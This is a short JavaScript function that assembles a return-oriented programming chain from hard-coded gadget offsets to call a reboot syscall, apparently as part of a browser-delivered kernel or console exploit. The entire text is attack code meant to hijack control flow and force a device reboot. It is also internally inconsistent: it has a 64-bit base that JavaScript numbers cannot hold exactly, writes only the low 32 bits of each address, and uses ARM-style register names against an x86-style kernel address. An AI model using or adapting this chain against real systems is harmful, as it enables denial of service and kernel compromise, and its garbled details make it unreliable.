function setupROP() {
  ropChain = new Uint32Array(0x400);
  let i = 0;

  const LIBKERNEL_BASE = 0xFFFFFFFF82600000;

  const GADGET_POP_X0 = LIBKERNEL_BASE + 0x1A2FFC;
  const GADGET_POP_X1 = LIBKERNEL_BASE + 0x1A3020;
  const GADGET_POP_X2 = LIBKERNEL_BASE + 0x1A3040;
  const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;

  const SYSCALL_REBOOT = 0x81;
  const REBOOT_CODE = 0x100;

  // ROP chain layout
  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
  ropChain[i++] = SYSCALL_REBOOT;      // x0 = syscall number

  ropChain[i++] = GADGET_POP_X1 & 0xFFFFFFFF;
  ropChain[i++] = REBOOT_CODE;         // x1 = reboot mode

  ropChain[i++] = GADGET_POP_X2 & 0xFFFFFFFF;
  ropChain[i++] = 0;                   // x2 = unused

  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;

  debug_log("ROP chain (sys_reboot) initialized.");
  return ropChain;
}
